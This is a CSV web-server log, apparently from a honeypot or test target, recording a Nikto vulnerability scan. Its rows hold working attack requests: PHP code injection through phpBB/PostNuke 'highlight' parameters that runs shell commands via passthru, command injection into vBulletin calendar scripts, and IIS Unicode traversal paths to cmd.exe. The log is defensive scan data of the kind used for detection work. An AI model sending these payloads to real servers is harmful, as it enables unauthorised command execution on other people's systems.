timestamp,method,path,status,ip,port,uuid,sess_uuid,detection_name,detection_type,user_agent,referer
2025-05-20T07:33:05.312855,GET,/postnuke/html/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.318233,GET,/modules/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.323383,GET,/phpBB/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.328114,GET,/forum/index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,239c485d-912d-4a22-9cff-010d0409c74e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001391),
2025-05-20T07:33:05.333534,GET,/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:33:05.338432,GET,/postnuke/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:33:05.343096,GET,/postnuke/html/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:33:05.348399,GET,/modules/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:33:05.353472,GET,/phpBB/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:33:05.359828,GET,/forum/viewtopic.php?t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,54954726-2b01-46d0-bcda-c158420fb7ad,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001392),
2025-05-20T07:33:05.365679,GET,/index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,e2adedd7-d0f8-44e4-be25-dfa37180ec54,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001393),
2025-05-20T07:33:05.370811,GET,/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,fa8e7bc3-c6e0-4049-9ab2-c07b17e68df5,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001394),
2025-05-20T07:33:05.375480,GET,/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,34419ee6-4a45-4784-a5cb-a4fdea5acb19,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001395),
2025-05-20T07:33:05.380780,GET,/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,b3a3fd46-2c1f-4367-b7f4-179bda0316cd,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001396),
2025-05-20T07:33:05.385907,GET,/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.390650,GET,/postnuke/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.396292,GET,/postnuke/html/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.401460,GET,/modules/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.406229,GET,/phpBB/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.413559,GET,/forum/index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.418367,GET,/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.422983,GET,/postnuke/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.428607,GET,/postnuke/html/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.433693,GET,/modules/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.438573,GET,/phpBB/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.443793,GET,/forum/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,27659614-fe77-48f1-a1bd-a2cc8ce73633,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001397),
2025-05-20T07:33:05.449086,GET,/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.453787,GET,/postnuke/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.459073,GET,/postnuke/html/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.465404,GET,/modules/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.470048,GET,/phpBB/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.475499,GET,/forum/index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.481342,GET,/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.486877,GET,/postnuke/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.492295,GET,/postnuke/html/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.497791,GET,/modules/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.503168,GET,/phpBB/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.508222,GET,/forum/index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3febfb3b-612d-4210-b889-c57e325e696c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001398),
2025-05-20T07:33:05.513337,GET,/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,f2e6b2ca-0586-4f53-b6cc-6b50d262513b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399),
2025-05-20T07:33:05.520711,GET,/postnuke/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,f2e6b2ca-0586-4f53-b6cc-6b50d262513b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399),
2025-05-20T07:33:05.525553,GET,/postnuke/html/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,f2e6b2ca-0586-4f53-b6cc-6b50d262513b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399),
2025-05-20T07:33:05.531054,GET,/modules/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,f2e6b2ca-0586-4f53-b6cc-6b50d262513b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399),
2025-05-20T07:33:05.536694,GET,/phpBB/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,f2e6b2ca-0586-4f53-b6cc-6b50d262513b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399),
2025-05-20T07:33:05.541571,GET,/forum/viewtopic.php?t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,f2e6b2ca-0586-4f53-b6cc-6b50d262513b,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001399),
2025-05-20T07:33:05.547006,GET,/index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,6f2380b8-dfa6-47b3-86f0-6a47fbd10aed,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001400),
2025-05-20T07:33:05.552113,GET,/msadc/msadcs.dll,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,3cc5e89a-d148-4448-84a1-13ed840acf5e,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001474),
2025-05-20T07:33:05.556225,GET,/uploader.php,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,2addb851-419a-41bd-99fa-a49b569c8861,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003018),
2025-05-20T07:33:05.560786,GET,/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,4be90a1f-f94f-4ea9-9477-602728e03c66,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003039),
2025-05-20T07:33:05.566189,GET,/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,8b292dd7-b468-4052-84f4-4a1a4a78563a,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003040),
2025-05-20T07:33:05.572446,GET,/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,99225fb6-9743-4ccf-8ac1-5d3be95a7fbe,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003041),
2025-05-20T07:33:05.577277,GET,/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,2165b83a-4dae-486e-992f-d5dc22bacc92,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003042),
2025-05-20T07:33:05.582880,GET,/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,2af50617-5968-46f3-8d4b-69de566b486f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003043),
2025-05-20T07:33:05.587364,GET,/_vti_bin/fpcount.exe,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,23dd6dbe-26ec-4844-b694-30f418d9711c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003089),
2025-05-20T07:33:05.591481,GET,/site/eg/source.asp,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,c9974e95-51c8-4e51-a46d-87eaf8d35541,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003126),
2025-05-20T07:33:05.596525,GET,/certsrv/..%c0%af../winnt/system32/cmd.exe?/c+dir,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,580f8f72-bff9-406b-966f-596c8be6c58f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003190),
2025-05-20T07:33:05.601588,GET,/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,343ee2b5-792e-4f01-b2ae-942198e0674a,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003191),
2025-05-20T07:33:05.606241,GET,/iisadmpwd/..%c0%af../winnt/system32/cmd.exe?/c+dir,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,b7f6aeed-5f50-44c7-98eb-1f6375d15cff,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003192),
2025-05-20T07:33:05.611162,GET,/msadc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,c3b884eb-91fc-4e52-8a17-4f63df251270,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003193),
2025-05-20T07:33:05.616294,GET,/pbserver/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,563cf2f4-26d4-4b2f-b465-0181c0a041ba,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003194),
2025-05-20T07:33:05.622724,GET,/rpc/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,2f21bacc-5bbc-40ba-9b64-e9b55747561f,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003195),
2025-05-20T07:33:05.628387,GET,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,b0cd618d-1434-4857-aeef-0e7ed50b6dda,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003196),
2025-05-20T07:33:05.633453,GET,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir,200,172.18.0.1,56638,6fd7ef35-b057-461d-aaec-677f18cc692b,60190d1a-d414-43d3-ac53-9c88d514be0c,index,1,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003197),
